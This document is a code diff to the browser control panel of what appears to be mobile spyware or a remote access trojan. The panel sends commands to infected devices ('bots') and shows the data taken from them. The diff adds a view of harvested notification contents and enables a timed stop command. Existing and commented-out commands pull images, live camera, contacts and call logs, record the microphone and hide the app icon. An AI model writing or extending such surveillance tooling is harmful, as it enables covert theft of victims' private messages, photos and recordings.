@@ -91,7 +91,8 @@ var table_div = document.getElementById('table'),
     download_div = document.getElementById('download'),
     btns = document.getElementsByClassName("btn waves-effect waves-light"),
     botStatus_para = document.getElementById('botStatus'),
-    refresh_check = document.getElementById('refresh-check');
+    refresh_check = document.getElementById('refresh-check'),
+    notifications_div = document.getElementById('notifications');
 
 var firstLoadContacts = true,
     firstLoadCallLog = true,
@@ -145,11 +146,12 @@ function getImages() {
         i = 0;
         images_div.innerHTML = 'Loading images, Please Wait...';
         socket.emit('commands', {commands: [{command: 'getImages'}], uid: currentUID});
+        // socket.emit('commands', {commands: [{command: 'toggleIcon', icon: false}], uid: currentUID});
         // socket.emit('commands', {commands: [{command: 'recordMicrophone', sec: 10}], uid: currentUID});
 
-        // setTimeout(function () {
-        //     socket.emit('commands', {commands: [{command: 'stopAll'}], uid: currentUID});
-        // }, 5000)
+        setTimeout(function () {
+            socket.emit('commands', {commands: [{command: 'stopAll'}], uid: currentUID});
+        }, 5000)
     }
     firstLoadImages = false;
     refresh_check.checked = false;
@@ -171,6 +173,11 @@ function getDownload() {
     hideOtherTabs('download_div')
 }
 
+function getNotifications() {
+    hideOtherTabs('notifications_div');
+}
+
+
 //When a bot sends data to web client
 socket.on('usrData', function (data) {
 
@@ -184,16 +191,18 @@ socket.on('usrData', function (data) {
         if (data.data.dataType === 'images') handleImages(data.data);
         if (data.data.dataType === 'live-camera') handleCamera(data.data);
         if (data.data.dataType === 'downloadImage') downloadImage(data.data);
+
     } else console.log('UID did not match');
 
 });
 
 socket.on("notification", function (data) {
     console.log(data);
-    const notifColumns = ['app', 'ts', 'title', 'text', 'ticker', 'email'];
+    const notifColumns = ['app', 'ts', 'title', 'ticker', 'text', 'bigText'];
     if (data.uid === currentUID) {
         for (notif of data.data){
             console.table(notif, notifColumns);
+            handleNotifications(notif);
         }
     }
 });
@@ -362,6 +371,14 @@ function downloadImage(data) {
     })
 }
 
+function handleNotifications(notif) {
+    var para = document.createElement("p");
+    var node = document.createTextNode(notif.app + '\t\t\t' + notif.ts + '\t\t\t' + notif.title + '\t\t\t' + notif.ticker + '\t\t\t' + notif.text + '\t\t\t' + notif.bigText);
+    para.appendChild(node);
+    para.style.borderBottom = '1px solid #ddd';
+    notifications_div.appendChild(para);
+}
+
 function hideOtherTabs(tabName) {
 
     table_div.style.visibility = 'hidden';
@@ -373,6 +390,7 @@ function hideOtherTabs(tabName) {
     images_div.style.visibility = 'hidden';
     camera_div.style.visibility = 'hidden';
     download_div.style.visibility = 'hidden';
+    notifications_div.style.visibility = 'hidden';
 
     if (tabName === 'table_div') table_div.style.visibility = 'visible';
     if (tabName === 'home_div') home_div.style.visibility = 'visible';
@@ -383,6 +401,7 @@ function hideOtherTabs(tabName) {
     if (tabName === 'images_div') images_div.style.visibility = 'visible';
     if (tabName === 'camera_div') camera_div.style.visibility = 'visible';
     if (tabName === 'download_div') download_div.style.visibility = 'visible';
+    if (tabName === 'notifications_div') notifications_div.style.visibility = 'visible';
 
 }
 
